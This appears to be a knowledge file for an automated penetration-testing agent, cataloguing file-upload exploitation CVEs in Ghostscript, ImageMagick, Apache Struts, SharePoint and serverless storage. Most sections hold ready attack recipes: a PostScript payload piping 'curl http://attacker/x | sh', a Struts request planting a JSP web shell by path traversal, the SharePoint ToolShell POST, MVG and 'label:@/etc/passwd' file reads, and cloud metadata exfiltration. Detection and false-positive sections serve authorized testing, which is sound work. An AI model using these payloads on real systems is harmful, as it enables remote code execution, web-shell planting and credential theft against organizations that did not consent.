---
name: insecure-file-uploads-novel-deep
description: 2024-2026 upload-exploitation CVEs — Ghostscript uniprint format-string sandbox escape, Struts top.* mass-assignment, SharePoint ToolShell delivery, and the historical toolchain-RCE catalog with version boundaries.
sibling: insecure_file_uploads
load_when: scan_mode == "deep"
---

# Insecure File Uploads — 2024–2026 CVE Catalog and Version Boundaries

Base `insecure_file_uploads.md` owns the pipeline framing, the per-server execution table, and the one-line CVE class-shapes with routes to this file. `insecure_file_uploads_advanced_deep.md` owns the per-server + per-engine technique primitives (Nginx path-info, Apache MultiViews, IIS web.config, Tomcat PUT, polyglot construction, SVG renderer-differential, filter-chain exploitation, archive-attack family, S3 POST policy abuse, ExifTool DjVu class, processing races). This file owns the version-boundary-as-finding content for the 2024–2026 upload-reachable CVEs (CVE-2024-29510, CVE-2024-53677, CVE-2025-53770, CVE-2023-36664) and the historical catalog with version boundaries (CVE-2016-3714, CVE-2018-16509, prior Ghostscript sandbox escapes) that remain reachable against legacy targets.

## Ghostscript uniprint Format-String Sandbox Escape (CVE-2024-29510)

**Primitive.** Artifex Ghostscript's `uniprint` output device accepts user-settable string parameters `upYMoveCommand`, `upWriteComponentCommands`, and similar that feed into `gs_snprintf` / `gp_fprintf` without specifier sanitization. The result is a classic format-string injection: `%s` and `%x` yield arbitrary stack and heap reads; `%n` and `%hn` yield arbitrary writes. The specific exploit chain dereferences a known pointer sequence `out → memory → gs_lib_ctx → core → path_control_active` and overwrites that boolean to zero, which disables all `-dSAFER` restrictions and re-enables the previously-blocked `%pipe%command` operator for OS command execution. The result is a single-document RCE from any upload surface whose pipeline shells to Ghostscript.

**Preconditions.** All of: (i) Ghostscript version before 10.03.1 is installed (fingerprint: `gs --version` returns a version lower than `10.03.1`, OR the engine's error output references the vulnerable code path); (ii) the upload pipeline shells to GS with `-dSAFER` (standard-but-defeated — the primitive specifically re-enables the dangerous operators that `-dSAFER` would otherwise block); (iii) the upload surface accepts a PS/EPS file, OR accepts a file type that ImageMagick's PS delegate converts through GS (EPS, PDF rendered through GS, image types with `-density` triggering PS rendering); (iv) the attacker can supply the `uniprint` device parameters, which an EPS or PS file does inline via setpagedevice.

**Attack recipe.**

```postscript
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
% Set uniprint device parameters to attacker-controlled format-string:
<<
  /OutputDevice /uniprint
  /upYMoveCommand (%s%s%s%s%s%s%s%s%s%n)
%% The format-string injection chain:
%% - leading %s traverses the stack to a known pointer position
%% - final %n writes to the pointer, flipping path_control_active to 0
%% - subsequent %pipe% command executes OS command
>> setpagedevice
% After the write, path_control_active=0 → -dSAFER restrictions off:
(%pipe%curl http://attacker/x | sh) (w) file closefile
showpage
```

ImageMagick's PS delegate is a particularly dangerous upstream for this primitive: a `.jpg` filename is accepted by magic-byte-oblivious upload validators, but the file body is EPS, and ImageMagick identifies it as PS and shells to GS. Observed in-the-wild exploitation used `EPS disguised as JPG` polyglots uploaded to document-conversion pipelines.

**Confirmation signal.** The GS process emits output or side effects (outbound HTTP, file write, shell command result) consistent with the embedded `%pipe%` command, not with PS rendering. The `strace` of the GS process shows `execve`, `connect`, or `openat` syscalls that bare PS rendering would not produce. A control run of the same file on a patched Ghostscript (≥10.03.1) returns an error about the format-string or about `%pipe%` being blocked — the measured difference between patched and unpatched versions is the version-boundary finding.

**Impact.** Full RCE as the Ghostscript process user from any upload pipeline that shells to a pre-10.03.1 GS. The exploit is single-document, no interaction, no second request. CVSS 6.3 per NVD; the real-world impact is higher because the exploitation surface is every document-conversion pipeline on the open web. Class abstraction: **a sandboxed interpreter's security relies on sanitizing every API boundary that touches attacker-controlled strings; a single format-string sink in a device driver bypasses years of hardening in a single step. The hunt is to grep Ghostscript's device sources for `gs_snprintf` / `gp_fprintf` with user-settable string parameters that are not whitelisted — the same pattern recurs across other devices.** Patched in Ghostscript 10.03.1 (2024-05-02). GHSA / NVD canonical: `https://nvd.nist.gov/vuln/detail/CVE-2024-29510`; Artifex release notes: `https://ghostscript.readthedocs.io/en/gs10.03.1/News.html`.

## Ghostscript Pipe-Device Command Injection (CVE-2023-36664)

**Primitive.** Pre-10.01.2 Ghostscript mishandles the permission validation for the pipe-device construction — a filename beginning with `%pipe%` or `|` is treated as a device + command, and GS fails to enforce the `-dSAFER` policy's intended block on the pipe device. A crafted PS/EPS or a PDF/image that GS renders can therefore execute an OS command on open, with no secondary primitive needed.

**Preconditions.** All of: (i) Ghostscript version from the historical lineage through 10.01.2 is installed (fingerprint: `gs --version` ≤ 10.01.2); (ii) the upload pipeline shells to GS, with `-dSAFER` enabled (ironic — the CVE is specifically that `-dSAFER` fails to block the primitive); (iii) the upload surface accepts a PS/EPS file OR a file type that GS renders.

**Attack recipe.**

```postscript
%!PS-Adobe-3.0
%%BoundingBox: 0 0 100 100
% The filename beginning with %pipe% is treated as a device + command:
(%pipe%id > /tmp/pwn) (w) file closefile
showpage
```

**Confirmation signal.** The GS process writes to `/tmp/pwn` (or whatever target the embedded command specifies); `strace` shows the `execve("/bin/sh", ...)` with the embedded command as argument. On a patched Ghostscript (≥10.01.2), the same input produces an error about `-dSAFER` blocking the device, and the file write does not occur — the version-boundary is observable.

**Impact.** Full RCE as the GS process user from any upload surface that reaches a pre-10.01.2 Ghostscript. Patched in Ghostscript 10.01.2 (2023-06-21); legacy deployments without recent patch cycles remain reachable. NVD canonical: `https://nvd.nist.gov/vuln/detail/CVE-2023-36664`. Class abstraction: **"sandbox" mode in interpreters is a configuration flag; the specific set of operations the flag blocks is a per-release decision that drifts, so sandbox-reliant deployments need to version-track the policy, not just the engine.**

## Ghostscript -dSAFER Historical Catalog

**Primitive.** The `-dSAFER` sandbox flag has been bypassed repeatedly across Ghostscript's release history; each CVE is a distinct bypass mechanism that re-enables one or more operators the sandbox was meant to block. The 2018-era CVE-2018-16509 was an "incorrect restoration of privilege" bug — a sequence of operators restored permission state after a privileged operation completed without re-validating that the newly accessible resource was within the sandbox. The class generalizes across releases: every GS major has had at least one sandbox-escape CVE, and legacy deployments typically pin the version at the last-known-working release rather than patch cycle through newer sandbox regressions.

**Preconditions.** All of: (i) a legacy Ghostscript version in the vulnerable range for the specific CVE being exercised (version-match required per CVE); (ii) the upload pipeline shells to GS with `-dSAFER`; (iii) the upload surface accepts a format GS renders.

**Attack recipes (per CVE).** CVE-2018-16509 and successors are each a specific operator sequence; the historical PoC catalog is at the gs mailing list archives and the GhostPDL commit history. The general class pattern is: trigger a privileged op (file read, exec), observe the sandbox state after restoration, and chain the next operator before the state is re-validated.

**Confirmation signal.** The GS process accesses a resource outside the intended sandbox — reads a file whose path `-dSAFER` would normally refuse, or executes a command the sandbox would normally block. The specific primitive signature varies per CVE; version-fingerprint the engine first and then select the matching PoC.

**Impact.** RCE as the GS process user on legacy upload pipelines that pin GS at a vulnerable version. The pattern remains relevant because many "stable" Linux distros ship older Ghostscript versions with security-patch backports — but the backports are selective, and specific CVE classes have been missed in distro repackaging. Verify both the upstream version and the distro's patched-CVE list before concluding a target is closed. Catalog: `https://ghostscript.readthedocs.io/en/latest/News.html` and NVD searches for `cpe:/a:artifex:ghostscript`.

## ImageMagick Delegate-Coder Injection — Version Boundary (CVE-2016-3714)

**Primitive.** ImageMagick's delegate coders (`EPHEMERAL`, `HTTPS`, `MVG`, `MSL`, `TEXT`, `SHOW`, `WIN`, `PLT`) accept input strings and interpolate them into shell commands without sufficient escaping. A crafted image file whose header selects one of these coders and whose content contains shell metacharacters produces OS command execution, file-read (`label:@/etc/passwd`), or SSRF (`https://` coder reaches arbitrary URLs). The class is reachable from any image-upload surface that validates by magic byte (ImageMagick trusts its own `identify` which reads the format from content, not extension — a `.jpg` filename with MVG content triggers the MVG coder).

**Preconditions.** All of: (i) ImageMagick version before 6.9.3-10 or 7.x before 7.0.1-1 is installed, OR a later version with a `policy.xml` that fails to deny the dangerous coders (the modern mitigation is `coder rights="none"` on each dangerous coder; the per-distro default `policy.xml` has drifted and the specific deployment may have reverted or extended the list); (ii) the upload pipeline passes files to ImageMagick for processing (identify, convert, thumbnail generation); (iii) the attacker can supply content whose format is one of the vulnerable coders.

**Attack recipe.**

```
# MVG payload — the delegate-coder parses as a drawing script and reaches shell:
push graphic-context
viewbox 0 0 640 480
image copy 0,0 0,0 'url(https://attacker/evil.svg)'
pop graphic-context

# label: coder for arbitrary file read (even on patched versions where
# this coder isn't denied — the primitive is coder-specific):
convert 'label:@/etc/passwd' /tmp/leak.png
# the file content lands rendered into the PNG; download the PNG to read.
```

**Confirmation signal.** The ImageMagick process executes a shell command (observable via `strace` or outbound-request logs) or reads a file whose path matches the `label:@` or `url()` argument. The `convert` output image contains data from the referenced resource, confirming the coder reached the read sink. For a patched version with correct `policy.xml`, the same input produces a `coder not authorized` error.

**Impact.** RCE from any image-upload surface against unpatched ImageMagick, OR file read via `label:@`, OR SSRF via `https://` coder. The modern mitigation (`policy.xml` with `coder rights="none"`) is often incomplete in production — specific coders are missed, and the deployment uses a vendor-provided `policy.xml` that lags upstream. The hunt is to read the deployed `policy.xml` and confirm every dangerous coder is denied. Patched in ImageMagick 6.9.3-10 (2016-05-03) and 7.0.1-1 (2016-05-10); current ImageMagick (7.1.x) has defaults closer to safe but still allows SVG+MSVG delegates by default on many distros. NVD: `https://nvd.nist.gov/vuln/detail/CVE-2016-3714`.

## Struts top.fileFileName Mass-Assignment Primitive (CVE-2024-53677)

**Primitive.** Apache Struts 2's `ParametersInterceptor` processes multipart POST body fields and assigns them onto the action class's fields via OGNL value-stack access. A field name `top.fileFileName` reaches the action's `fileFileName` property through the OGNL `top` context (the top-of-stack action), with the attacker-supplied value including path-traversal sequences. The file-upload interceptor subsequently writes the uploaded file content to the attacker-chosen path. The combined chain is multipart-POST-driven arbitrary-webroot write, which converts a mundane file upload into a webroot-write-to-RCE primitive by dropping a JSP shell.

**Preconditions.** All of: (i) an Apache Struts 2 web application is deployed with the `ParametersInterceptor` enabled (default) and the FileUpload interceptor active; (ii) at least one action class accepts multipart file uploads via the standard `File`/`fileFileName`/`fileContentType` field triple; (iii) the servlet container's webroot is writable by the Struts process (typical). This primitive is intentionally described without a specific version-range claim — the research-pipeline framings of "affects 2.0.0 through 6.x" and "fix removes FileUploadInterceptor in 7.0.0" were refuted and must not be imported; verify the specific Struts version and consult Apache's S2-067 advisory for the authoritative affected range. The primitive mechanism (OGNL value-stack access via ParametersInterceptor driving arbitrary-webroot file write) is confirmed by independent researchers and by public PoCs.

**Attack recipe.**

```http
POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<% Runtime.getRuntime().exec(request.getParameter("c")); %>

--X
Content-Disposition: form-data; name="top.fileFileName"

../../../../usr/local/tomcat/webapps/ROOT/shell.jsp
--X--

# Subsequent GET executes the shell:
GET /shell.jsp?c=id HTTP/1.1
Host: target
```

**Confirmation signal.** The uploaded shell file lands at the attacker-chosen webroot path (observable via a successful `GET /shell.jsp` returning the JSP's rendered output); the request's response for the upload is normal (200), making the primitive quiet from an app-side perspective. A sibling control request without the `top.fileFileName` parameter writes the file to the Struts action's intended destination, confirming the parameter is the arbitrary-path-write primitive.

**Impact.** Full RCE as the Struts/Tomcat process user from any multipart-upload action on a vulnerable Struts deployment. Routes to `rce.md § Post-Upload Shell Establishment` for the exploitation surface. Apache advisory and the version-boundary authoritative source: `https://cwiki.apache.org/confluence/display/WW/S2-067` (publication state and specific affected range per Apache's S2-067); independent primitive confirmation: public PoC `TAM-K592/CVE-2024-53677-S2-067`. NVD canonical: `https://nvd.nist.gov/vuln/detail/CVE-2024-53677`.

## SharePoint ToolShell Delivery Primitive (CVE-2025-53770)

**Primitive.** A single unauthenticated POST to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` with a spoofed `Referer: /_layouts/15/signout.aspx` header bypasses the ToolPane authorization check (the `signout.aspx` referer is special-cased in a way that CVE-2025-53771 chains with for auth bypass) and triggers unsafe deserialization of the Scorecard:ExcelDataSet CompressedDataTable embedded in the request body. The deserialization writes an attacker-controlled `.aspx` file to the SharePoint webroot — observed in-the-wild artifact: `spinstall0.aspx` with SHA256 `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514`, dropped under `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\`. A subsequent browser GET to `/_layouts/15/spinstall0.aspx` triggers IIS/ASP.NET compilation and execution of the dropped shell under the SharePoint application-pool identity. The dropped shell's typical first stage exfiltrates the ASP.NET MachineKey (ValidationKey + DecryptionKey) to the attacker; full RCE then proceeds via forged `__VIEWSTATE` using `ysoserial.net` and routes to `insecure_deserialization.md § ASP.NET ViewState Forgery`.

**Preconditions.** All of: (i) on-premises SharePoint Server in a version in the vulnerable range (the authoritative version-boundary is Microsoft MSRC's CVE-2025-53770 advisory; the active-exploitation window began 2025-07-18 and CISA added the CVE to KEV on 2025-07-18+); (ii) the SharePoint ToolPane endpoint is network-reachable (the vulnerability is unauthenticated, so the exposure is wherever the SharePoint front-end is reachable from); (iii) for the full-RCE chain beyond file-drop, the attacker proceeds to the deserialization step with the leaked MachineKey; the file-drop primitive alone is defacement-grade but the MachineKey-leak chain reaches full RCE under the application-pool identity.

**Attack recipe.**

```http
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1
Host: sharepoint-target
Referer: /_layouts/15/signout.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

__VIEWSTATE=<base64-encoded Scorecard:ExcelDataSet CompressedDataTable payload with
the attacker's dropped shell encoded as the file content>&__VIEWSTATEGENERATOR=...
```

The payload's exact XML structure is documented in Microsoft's MSRC entry and in the Hadrian / Rapid7 / Trend Micro writeups; the file-drop primitive is confirmed across all primary sources. The subsequent browser GET to `/_layouts/15/spinstall0.aspx` activates the shell:

```http
GET /_layouts/15/spinstall0.aspx HTTP/1.1
Host: sharepoint-target
```

**Confirmation signal.** The `spinstall0.aspx` artifact (or any attacker-named `.aspx`) lands under the SharePoint `TEMPLATE\LAYOUTS` directory, observable via filesystem inspection on the SharePoint host or via a sibling GET returning the compiled shell's output. The IIS access log shows the ToolPane.aspx POST and the subsequent `.aspx` GET; the ASP.NET application log shows the deserialization callbacks firing. Independent corroboration: the dropped shell's SHA256 matches `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514` on standard in-the-wild builds (variants exist; the SHA is a strong but not sole indicator).

**Impact.** The delivery/activation primitive drops a web shell under the SharePoint webroot — defacement-grade in isolation. The practical real-world impact is the full chain: the dropped shell exfiltrates MachineKey, the attacker forges `__VIEWSTATE`, and full RCE under the application-pool identity follows via the ASP.NET deserialization sink. Report the delivery primitive separately from the deserialization chain; the file-upload class owns the first POST, and `insecure_deserialization.md § ASP.NET ViewState Forgery` owns the MachineKey-and-ysoserial.net chain. The ToolShell framing of "single POST = full RCE" was adversarially evaluated 2-1 in the Batch 10 research — scope the finding to the delivery primitive, not to "unauthenticated single POST produces full RCE in one step." CVSS 9.8 per Microsoft MSRC. NVD canonical: `https://nvd.nist.gov/vuln/detail/CVE-2025-53770`; Microsoft MSRC: `https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770`.

## Canonical Version/Fix Table

Single-owner for Batch 10 upload-reachable CVEs — the per-trio CVE single-ownership standard parks all version strings and GHSA IDs here. Base files name CVE numbers + one-line class-shape + a route to this file; advanced files reference CVEs by number only.

| CVE | Component | Vulnerable Range | Patched Version | Mechanism Fingerprint |
|---|---|---|---|---|
| CVE-2024-29510 | Ghostscript | before 10.03.1 | 10.03.1 (2024-05-02) | `uniprint` format-string → `%s/%x/%n` → `path_control_active=0` → `%pipe%` RCE |
| CVE-2023-36664 | Ghostscript | before 10.01.2 | 10.01.2 (2023-06-21) | `-dSAFER` fails to block `%pipe%`/`\|` prefix in filename → OS command on open |
| CVE-2018-16509 | Ghostscript | before 9.24 | 9.24 (2018-09-24) | `-dSAFER` restoration-of-privilege bug — operator sequence re-enables privileged ops |
| CVE-2016-3714 | ImageMagick | before 6.9.3-10 / 7.x before 7.0.1-1 | 6.9.3-10 (2016-05-03), 7.0.1-1 (2016-05-10) | Delegate-coder shell-metacharacter injection in `MVG/MSL/HTTPS/EPHEMERAL/TEXT/SHOW/WIN/PLT` |
| CVE-2024-53677 | Apache Struts 2 | per Apache S2-067 advisory | per Apache S2-067 advisory | `top.fileFileName` OGNL mass-assignment via `ParametersInterceptor` → arbitrary webroot file write |
| CVE-2025-53770 | SharePoint Server (on-prem) | per Microsoft MSRC advisory | per Microsoft MSRC advisory | Unauth POST to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + spoofed Referer → Scorecard:ExcelDataSet deser → `.aspx` drop |

The Apache Struts and SharePoint rows explicitly defer version-boundary detail to the vendor advisories because the researched-pipeline framings of "affected range" for both were adversarially evaluated and found refuted or incomplete in the Batch 10 verification pass; the authoritative source is the vendor advisory, not a secondary analyst writeup. The primitive-mechanism columns above are confirmed by primary sources (Apache S2-067 for Struts; Microsoft MSRC for SharePoint) and by multiple independent in-the-wild observations.

## Measured Boundary — Ghostscript uniprint (Build-Dependent Reachability)

The CVE-2024-29510 primitive is one of the §5-measurement candidates called out by the Batch 10 research. A sandbox measurement against Ubuntu's apt-packaged `ghostscript` on Ubuntu 22.04 (gs 9.55.0 — pre-10.03.1, pre-10.01.2) and Ubuntu 24.04 (gs 10.02.1 — pre-10.03.1, post-10.01.2) produced a **measured-negative result**: both builds reject the uniprint output device at `setpagedevice` time with `Error: /undefined in --setpagedevice--`, because Ubuntu's distro build is a cut-down configure that does **not** compile in the `uniprint` output device. The measurement is persisted at `.zen-batch-artifacts/batch-10/measurements/ghostscript_uniprint.{sh,out}` and the finding is: **CVE-2024-29510 reachability is build-dependent, not purely version-dependent** — the vulnerable sink lives in `uniprint`, and a Ghostscript build without `uniprint` compiled in is not reachable through this specific primitive even when the version string is in the vulnerable range.

The practical implication for pentest engagements: fingerprint the deployed Ghostscript's compiled-in device list (`gs -h | sed -n '/Available devices/,/^Search/p'`) before concluding the version check is sufficient. Upstream Artifex binary distributions and most "full" distro packages ship `uniprint`; minimal "lite" distros and container-optimized builds often omit it. The upstream reference engine from `ghostscript.readthedocs.io` is the canonical "vulnerable" target for CVE-2024-29510 — distro packaging and build-time configure flags are the per-deployment variable. A measured negative result on the deployed engine therefore scopes the finding ("the primitive is reachable in upstream builds but not in this specific distro's apt-packaged binary"); a measured positive on a stood-up upstream build confirms the primitive's mechanism and lets the pentester state the specific-build reachability narrowly.

## Serverless and Edge Upload Handler Frontier (2024–2026 Non-CVE Class)

**Primitive.** Serverless and edge upload handlers (AWS Lambda / Lambda@Edge, Cloudflare Workers + R2, Vercel Edge Functions + Vercel Blob, Netlify Functions + Netlify Blobs, Deno Deploy, Supabase Storage, Firebase Storage) replace the traditional web-server-plus-storage pipeline with a presigned-URL-plus-event-driven-processor model. The 2024–2026 frontier for this surface is largely non-CVE-gated — vendor patches are silent and version-opaque — so the primitive class is more productive than the per-vendor CVE hunt. Three class patterns recur: (1) **cross-origin presigned-URL abuse** where the signing endpoint grants a URL whose policy conditions the signing-logic forgot to scope; (2) **edge-function pre-upload-handler trust gaps** where the function validates request shape but trusts attacker-provided fields that reach the storage layer; (3) **preview-pipeline execution** where a Vercel/Netlify preview deployment renders attacker-uploaded content as the branch-preview's trusted origin, converting upload to stored-XSS on `*.vercel.app` or `*.netlify.app`.

**Preconditions.** All of: (i) the target uses a serverless or edge upload handler (fingerprint from the hostname, from `Server:` headers like `cloudflare`, `AmazonS3`, `Vercel`, `Netlify`, from the signing-endpoint response's JSON shape, or from client-bundle inspection); (ii) at least one of the three class patterns applies — attacker-controllable signing fields, attacker-controllable storage-trusted metadata, or preview-deployment-trusted serving. For presigned-URL abuse specifically: the signing endpoint returns a URL (not just signed form fields) AND the URL's cryptographic signature covers fewer fields than the policy intends.

**Attack recipes (per class).**

```bash
# Class 1 — Cloudflare R2 / Supabase Storage / Firebase Storage presigned-upload-URL abuse:
# The signing endpoint grants a presigned PUT URL for an object key.
# If the signing logic forgot to constrain Content-Type or the key prefix:
curl -s -X POST 'https://app/api/sign-upload' -H 'Cookie: session=<self>' \
  -d '{"filename":"avatar.jpg","contentType":"image/jpeg"}'
# Response: {"url":"https://<bucket>.r2.cloudflarestorage.com/avatars/user-123/avatar.jpg?X-Amz-...","fields":...}

# Submit the PUT with attacker-chosen Content-Type (the signing endpoint
# requested image/jpeg but the signature doesn't cover the request Content-Type):
curl -X PUT "<signed-url>" \
  -H 'Content-Type: text/html' \
  --data-binary '<script>alert(document.cookie)</script>'
# Confirm: GET the stored object; if the response Content-Type is text/html,
# the signing-side didn't lock Content-Type and the primitive is live.

# Class 2 — Vercel Blob / Netlify Blobs attacker-controlled storage-trusted
# metadata reaching the storage layer:
# The edge function receives the upload and forwards to the storage backend;
# attacker-provided `x-vercel-filename` / `x-amz-meta-*` / `x-upload-metadata`
# headers reach the storage layer and are reflected on later reads.
curl -X POST 'https://target.vercel.app/api/upload' \
  -H 'x-vercel-filename: shell.html' \
  -H 'x-upload-metadata: {"contentDisposition":"inline"}' \
  --data-binary '<script>...</script>'

# Class 3 — Vercel/Netlify branch-preview deployment trusted-serving:
# PR-created preview deployments publish at *.vercel.app / *.netlify.app and
# share CORS/CSP trust configurations with production. An upload surface on
# a preview branch stores content that renders at a *.vercel.app origin that
# the production app's CSP allowlists.
# 1. Trigger a preview deploy via a PR with an upload-serving branch.
# 2. Upload attacker HTML through the preview's upload endpoint.
# 3. Load the preview URL from within the production app's CSP scope.
# 4. Attacker HTML executes in production-trusted-origin context.
```

For the cryptographic-signature-coverage gap specifically, the AWS SigV4 signature covers canonicalized headers listed in the `SignedHeaders` field of the URL. Headers NOT in `SignedHeaders` are not covered and can be modified by the client. Many SDK-generated presigned URLs include only `host` and `x-amz-date` in `SignedHeaders`, leaving `Content-Type`, `Content-Disposition`, and `x-amz-meta-*` client-modifiable. GCS and Azure Blob SAS have analogous gaps — GCS's V4 signatures also use a `SignedHeaders` equivalent; Azure SAS URLs commit to specific signed-resource and permissions but may leave Content-Type as a client-set field on PUT.

**Confirmation signal.** For Class 1: `curl -I` on the stored object returns the attacker-chosen Content-Type and Content-Disposition; the file renders as HTML in a browser. For Class 2: the edge function's downstream storage write includes the attacker-provided metadata; the subsequent read reflects the metadata. For Class 3: the preview-deployment URL loads attacker HTML in a browser; the production app's CSP permits the preview origin (observable via a cross-origin fetch from the preview to a production-authenticated endpoint).

**Impact.** Stored XSS on a trusted-origin (bucket / preview-deployment / edge-function serving); cross-tenant object write (Class 1 with unconstrained key prefix); production-identity-pivot via preview-deployment trust (Class 3). The 2024–2026 frontier observation: cloud-vendor documentation increasingly includes "SigV4 Content-Type is not signed by default" warnings, but SDK-generated presigned URLs still ship with incomplete `SignedHeaders` on default usage. The hunt is to request a presigned URL from the target, inspect `SignedHeaders`, and PUT with every unmentioned field attacker-controlled. Routes to `xss.md § Stored XSS` for exploitation and to `subdomain_takeover_advanced_deep.md § CDN Alt-Origin Cache Poisoning` for the preview-deployment CDN interaction.

## Historical Catalog — Reachability on Legacy Targets

The ImageTragick lineage (CVE-2016-3714 and the SVG+MSVG delegate class that followed), the pre-9.24 Ghostscript `-dSAFER` restoration bugs, and the pre-10.01.2 `%pipe%` class remain live against legacy deployments — distros with security-patch backports commonly repackage only the single CVE under a specific advisory, missing variant mechanisms that share the primitive class but have distinct CVE numbers. Target enumeration for a pentest engagement should include: `convert --version` and `gs --version` on every host that runs document conversion; `policy.xml` content inspection (not just presence) on every ImageMagick deployment; and a magic-byte-reaching probe (a `.jpg` whose body is EPS, routed through the pipeline, with the GS version echoed in a known-safe way such as a `label:@/etc/some-trace-file`) to confirm the engine is reached. On ancient targets where the policy is laxer, the HTTPS and MVG coders are also directly reachable without needing a Ghostscript hop.

The Struts legacy pattern is distinct: Struts 2's OGNL double-evaluation lineage (S2-057 CVE-2018-11776, S2-053 CVE-2017-9805, S2-052, S2-045 CVE-2017-5638, and the family) produces direct OGNL RCE on vulnerable versions; CVE-2024-53677 is the mass-assignment-plus-webroot-write variant of the same OGNL-reach surface. Legacy Struts deployments are therefore multi-primitive: version-match the specific CVE and attempt both the direct-OGNL path and the mass-assignment path. See `rce.md § Struts OGNL` for the direct-OGNL class.

## Chaining Surface

**Upstream primitives:** `reconnaissance/*` surfaces upload endpoints; `broken_function_level_authorization.md` grants access to admin-only upload paths and to privileged document-conversion workflows; `idor.md` grants access to upload sinks owned by other tenants.

**Downstream capabilities:**

- `rce.md` — every Ghostscript / ImageMagick CVE and the Struts primitive drive directly to OS command execution.
- `insecure_deserialization.md § ASP.NET ViewState Forgery` — SharePoint ToolShell's dropped shell leaks MachineKey, forging `__VIEWSTATE` reaches full RCE through the deserialization sink (route by filename, not duplicated here).
- `xxe.md § SVG Delivery` — ImageTragick's SVG+MSVG delegate class reaches XXE through the server-side XML parser when the SVG delegate is enabled.
- `ssrf.md` — ImageMagick's `HTTPS` coder and MVG's `image copy ... url(...)` are SSRF primitives from inside the server-side rendering process.
- `path_traversal_lfi_rfi.md § PHP Filter Chain` — a benign upload reached by `php://filter` becomes PHP execution without any upload-side bug.

**Composite chains (routed by filename):**

1. **EPS-as-JPG → ImageMagick PS delegate → Ghostscript uniprint → path_control_active flip → `%pipe%` RCE.** Build a PostScript file with the `uniprint` format-string chain and a `.jpg` extension; upload through an avatar/thumbnail surface that validates by magic byte; ImageMagick identifies as PS and shells to Ghostscript; the format-string primitive flips `path_control_active`; the final `%pipe%` command executes OS code. Routes to `rce.md`. Version boundary: GS < 10.03.1.

2. **Struts multipart with `top.fileFileName` → arbitrary webroot write → JSP shell → RCE.** Standard multipart upload with the parameter smuggled through the ParametersInterceptor; the JSP lands in the Tomcat webroot; a sibling GET activates it. Routes to `rce.md`.

3. **SharePoint ToolShell POST → .aspx drop → MachineKey leak → __VIEWSTATE forge → ASP.NET ViewState deser RCE.** Unauth POST + spoofed Referer drops the shell; the shell exfiltrates MachineKey; the attacker forges __VIEWSTATE with `ysoserial.net`; the forged ViewState hits the standard ASP.NET deser sink and reaches full RCE. The *first POST* is the file-upload primitive; the *full RCE* routes to `insecure_deserialization.md § ASP.NET ViewState Forgery`.

4. **Ghostscript %pipe% → direct OS command on open.** Legacy GS (≤ 10.01.2) accepts `%pipe%command` as a filename; any upload surface that shells to legacy GS reaches RCE in one step. Routes to `rce.md`.

5. **ImageMagick MVG coder → SSRF + RCE combo.** A single MVG upload reaches `image copy ... url(https://169.254.169.254/latest/meta-data/)` for cloud IMDS exfiltration while the same file's shell-metacharacter payload reaches OS command execution. Routes to `ssrf.md § IMDS Exfiltration` and `rce.md`.

## Detection and Confirmation Methodology

- **Version-first fingerprinting.** The CVE class is only reachable on specific versions. `gs --version` and `convert --version` are the direct checks; where the deployment hides versions, fingerprint via error-page strings (Ghostscript's error output names its version in some paths), via timing fingerprints (specific optimizations in 10.03.x are observable), and via `policy.xml` content hashes for ImageMagick.
- **Measured probe for CVE-2024-29510.** Upload a minimal PS file setting the `uniprint` device with a benign format-string (`%s` only, no `%n`); if the engine echoes a crash, a stack-pointer-looking output, or a non-rendering error, the primitive is reachable. Full-exploit confirmation requires the `%n` write chain, which should run only in a controlled test environment.
- **ToolPane probe for CVE-2025-53770.** Issue the POST with an empty body + the spoofed Referer against a known SharePoint target; the response code and the presence/absence of a drop-site artifact (via a controlled scan of `/_layouts/15/`) distinguish patched from vulnerable deployments without triggering the deserialization chain. Microsoft's own MSRC guidance explicitly deprecates this probe for untargeted scanning — use only on authorized engagements.
- **Struts probe for CVE-2024-53677.** Issue a multipart upload with a `top.fileFileName=benign.txt` parameter and observe where the file lands; if the file is written to the parameter-controlled path rather than the action's expected destination, the primitive is reachable. A no-op path (ending in `.txt`) is enough to confirm without dropping an executable artifact.
- **Policy.xml inspection for CVE-2016-3714.** Read the deployed `policy.xml` content (not just its presence) and verify every dangerous coder has `rights="none"`. A policy that denies `MVG` but allows `MSL` is partially mitigated and remains reachable through the un-denied coder.

## False-Positive Discipline

- **Version-fingerprint alone is not confirmation.** A deployment running `gs 10.01.0` is in the CVE-2024-29510 and CVE-2023-36664 ranges, but the primitive only reaches RCE if the upload pipeline actually shells to GS AND the attacker can supply the matching input. Prove the engine is reached before escalating.
- **Patched version is a specific claim.** CVE-2024-29510 patched version is 10.03.1 per Artifex release notes; a `gs --version` returning 10.03.0 is still vulnerable; 10.03.1-rc builds are also vulnerable in the specific primitive. Do not round the version string.
- **"Affected range" for Struts should defer to Apache's advisory.** Secondary-source claims about CVE-2024-53677's affected range were refuted in the Batch 10 verification; the authoritative source is Apache's S2-067. Report "primitive mechanism confirmed, consult vendor advisory for affected range" rather than a specific range from secondary sources.
- **SharePoint ToolShell delivery is not full RCE on its own.** The CVE-2025-53770 primitive drops a shell; full RCE requires the MachineKey-leak + __VIEWSTATE-forge chain, which routes through `insecure_deserialization.md`. Scoping the finding to the delivery primitive is accurate; claiming "single POST = unauthenticated RCE" is scoped incorrectly per the Batch 10 verification pass.
- **ImageTragick with modern `policy.xml` may still be reachable.** The deployed policy may deny the specific coder PoC the attacker tries but leave other coders live. Read the policy, pick a non-denied coder, and retry — a partial mitigation is not a closed primitive.

## Validation

- Reproduce one chain primitive end-to-end against a controlled upload target; preserve the HTTP request transcript, the engine's version output, and the resulting side effect (file write, outbound HTTP, command output).
- For Ghostscript / ImageMagick primitives, capture the engine's exact version string and the content of `policy.xml` (ImageMagick) or the GS invocation flags (`-dSAFER`, `-dNOSAFER`, etc). The version-boundary claim is only valid if the deployment is observably in the vulnerable range.
